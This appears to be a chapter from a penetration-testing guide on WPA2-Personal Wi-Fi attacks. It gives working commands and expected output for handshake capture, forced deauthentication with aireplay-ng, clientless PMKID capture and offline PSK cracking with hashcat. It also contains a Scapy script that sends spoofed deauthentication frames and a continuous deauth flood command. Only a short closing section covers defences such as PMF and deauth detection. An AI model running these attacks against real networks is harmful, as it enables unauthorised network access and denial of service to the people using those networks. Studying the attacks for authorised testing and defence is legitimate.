# 04 — WPA2 Attack Vectors

## 4-Way Handshake Capture

The primary vector against WPA2-Personal is capturing the 4-way handshake and brute-forcing the PSK offline.

### Step 1: Identify Target

```bash
airodump-ng wlan0mon
# Note BSSID, channel, ESSID
```

### Step 2: Lock Channel and Capture

```bash
# Terminal 1: Start capture
airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w handshake wlan0mon

# Output shows CH 6, clients listed
# Wait for natural handshake or force reconnection
```

### Step 3: Force Handshake with Deauthentication

```bash
# Deauth specific client
aireplay-ng -0 10 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon

# Or deauth broadcast (all clients)
aireplay-ng -0 5 -a 00:11:22:33:44:55 wlan0mon

# Expected output:
# 00:11:22:33:44:55  AA:BB:CC:DD:EE:FF  DeAuth (send 10 packets)
# Client reconnects → handshake captured in handshake-01.cap
```

### Step 4: Verify Handshake

```bash
aircrack-ng handshake-01.cap

# Expected:
# Reading packets, please wait...
# Opening handshake-01.cap
# Read 12450 packets.
# 1 potential targets
# 00:11:22:33:44:55  HomeNetwork  WPA (1 handshake)
#        with ESSID: HomeNetwork
```

### Alternative: Convert to hashcat format

```bash
# Extract hash 22000 (unified WPA/WPA2 hash format for hashcat 6.2.0+)
hcxpcapngtool -o hash.hc22000 -E essidlist handshake-01.cap

# Verify hash file
head hash.hc22000
# Expected format: WPA*02*<hex>*<hex>*<hex>*<hex>*<hex>*<hex>*<hex>*<hex>
# Format: HMAC_SHA1_AES (02) = full 4-way handshake
# Format: PMKID (01) = clientless PMKID attack
```

## PMKID Attack (Clientless)

PMKID attack does not require a client to be connected. The AP includes the PMKID in the first message of the handshake when 802.11r (Fast BSS Transition) is enabled.

### Step 1: Capture PMKID

```bash
# Terminal 1: hcxdumptool
hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1 -c 6

# Wait for AP to send association response with PMKID
# Or trigger with probe request
```

### Step 2: Extract PMKID

```bash
hcxpcapngtool -o hash.hc22000 capture.pcapng

# Check for PMKID (hash mode 22001)
grep 'WPA\*01' hash.hc22000

# Expected: WPA*01*<hex>*<hex>*<hex>*<hex>*<hex>*<hex>*<hex>*<hex>
```

### Step 3: Crack with hashcat

```bash
# Crack with hashcat (unified mode 22000 for handshakes)
hashcat -m 22000 hash.hc22000 wordlist.txt

# For PMKID-only captures (WPA*01* prefix), hashcat auto-detects within mode 22000
# Legacy mode -m 22001 also works for PMKID-only files
```

## Deauthentication Flood

Mass deauthentication to deny service or force handshakes.

```bash
# Broadcast deauth (all clients)
aireplay-ng -0 0 -a 00:11:22:33:44:55 wlan0mon

# Expected: continuous output of DeAuth packets
# AP drops all associated clients
```

### Scapy Targeted Deauth

```python
#!/usr/bin/env python3
from scapy.all import *

ap = "00:11:22:33:44:55"
client = "AA:BB:CC:DD:EE:FF"
iface = "wlan0mon"

# Deauth from AP to client
dot11 = Dot11(addr1=client, addr2=ap, addr3=ap)
packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
sendp(packet, iface=iface, count=64, inter=0.1)

# Deauth from client to AP (spoofed)
dot11_spoof = Dot11(addr1=ap, addr2=client, addr3=ap)
packet_spoof = RadioTap() / dot11_spoof / Dot11Deauth(reason=7)
sendp(packet_spoof, iface=iface, count=64, inter=0.1)
```

Reason codes:
- 1: Unspecified reason
- 4: Inactivity
- 5: Too many clients
- 7: Class 3 frame from non-associated STA
- 8: Class 2 frame from non-authenticated STA

## Offensive Application

- **Handshake capture** → Offline PSK brute-force
- **PMKID capture** → Clientless attack, works even with no connected clients
- **Deauth flood** → Denial of service, forces reconnection for handshake capture
- **Channel switch** → Deauth + clone AP on different channel to downgrade client

## Defensive Application

- **PMF (802.11w)**: Encrypts management frames. Prevents standard deauth attacks but not all variants.
- **Deauth detection**: Monitor for sudden spike in DeAuth frames (kismet, aircrack-ng suite).
- **802.11k/v/r hardening**: Disable Fast BSS Transition if not needed (removes PMKID vector).
- **Rate limiting**: Enterprise APs can rate-limit management frames.
- **Client isolation**: Prevents client-to-client deauth relay.
